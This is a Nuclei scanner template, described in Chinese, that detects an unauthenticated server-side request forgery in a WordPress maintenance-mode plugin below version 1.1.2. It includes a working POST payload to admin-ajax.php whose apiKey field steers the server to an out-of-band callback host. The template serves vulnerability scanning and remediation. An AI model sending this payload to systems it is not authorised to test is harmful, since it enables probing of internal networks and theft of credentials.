id: wp-under-construction-ssrf

info:
  name: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - 服务端请求伪造 ( - 服务端请求伪造漏洞
  author: Akincibor
  severity: high
  description: |
    该模板用于检测 Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - 服务端请求伪造 ( - 服务端请求伪造漏洞。该类漏洞通常源于服务端按用户提供的地址发起请求，但缺少目标地址校验和内网访问限制。模板会向 `/wp-content/plugins/under-construction-maintenance-mode/readme.txt`、`/wp-admin/admin-ajax.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可借助目标服务器访问内网管理接口、云元数据地址或其他受信任网络资源。
    - 在可回显或可外带的场景下，SSRF 可能导致敏感信息泄露、凭据获取或进一步攻击内部系统。
  remediation: |
    - 对服务端请求目标使用严格白名单，禁止访问内网网段、回环地址、链路本地地址和云元数据地址。
    - 校验跳转后的最终地址，限制协议类型，并为出站请求配置最小化网络权限。
    - 监控异常内网访问和外联请求，轮换可能通过元数据接口泄露的凭据。
  reference:
    - https://wpscan.com/vulnerability/24784c84-3efd-4166-81c1-e5a266562cfc
    - https://packetstormsecurity.com/files/161576/
  classification:
    cwe-id: CWE-99,CWE-918
  metadata:
    verified: true
    max-request: 2
  tags: ssrf,wordpress,wp-plugin,unauth,wpscan,packetstorm,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/under-construction-maintenance-mode/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        internal: true
        words:
          - '= Under Construction'

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded

        action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
